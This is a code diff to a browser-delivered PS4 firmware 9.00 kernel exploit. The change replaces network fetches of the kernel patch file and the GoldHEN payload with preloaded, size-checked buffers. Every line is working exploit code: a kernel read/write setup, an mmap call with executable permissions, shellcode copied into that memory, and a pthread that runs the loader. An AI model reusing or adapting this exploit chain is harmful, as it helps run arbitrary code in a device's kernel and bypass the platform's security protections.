@@ -1483,13 +1483,12 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 // FUNCTIONS FOR STAGE: PATCH KERNEL
 
 async function get_patches(url) {
-    const response = await fetch(url);
-    if (!response.ok) {
-        throw Error(
-            `Network response was not OK, status: ${response.status}\n`
-            + `failed to fetch: ${url}`);
+    if (url !== './kpatch/900.elf'
+        || !window.gamezoneKpatchBuffer
+        || window.gamezoneKpatchBuffer.byteLength !== 5288) {
+        throw Error('Verified kernel patch was not loaded before exploit start');
     }
-    return response.arrayBuffer();
+    return window.gamezoneKpatchBuffer;
 }
 
 // 9.00 supported only
@@ -1829,19 +1828,16 @@ var loader_addr = chain.sysp(
  var tmpStubArray = array_from_address(loader_addr, 1);
  tmpStubArray[0] = 0x00C3E7FF;
 
- var req = new XMLHttpRequest();
- req.responseType = "arraybuffer";
- req.open('GET','payload.bin');
- req.send();
- req.onreadystatechange = function () {
-  if (req.readyState == 4) {
-   var PLD = req.response;
+   var PLD = window.gamezonePayloadBuffer;
+   if (!PLD || !PLD.byteLength) {
+    throw Error('Verified GoldHEN payload was not loaded before exploit start');
+   }
    var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
    var pl = array_from_address(payload_buffer, PLD.byteLength*4);
-   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-   tmp.set(new Uint8Array(req.response), 0);
-   tmp.set(padding, req.response.byteLength);
+   var padding = new Uint8Array(4 - (PLD.byteLength % 4) % 4);
+   var tmp = new Uint8Array(PLD.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(PLD), 0);
+   tmp.set(padding, PLD.byteLength);
    var shellcode = new Uint32Array(tmp.buffer);
    pl.set(shellcode,0);
    var pthread = malloc(0x10);
@@ -1853,7 +1849,5 @@ var loader_addr = chain.sysp(
         loader_addr,
         payload_buffer,
     );	
-   }
- };
 
 })
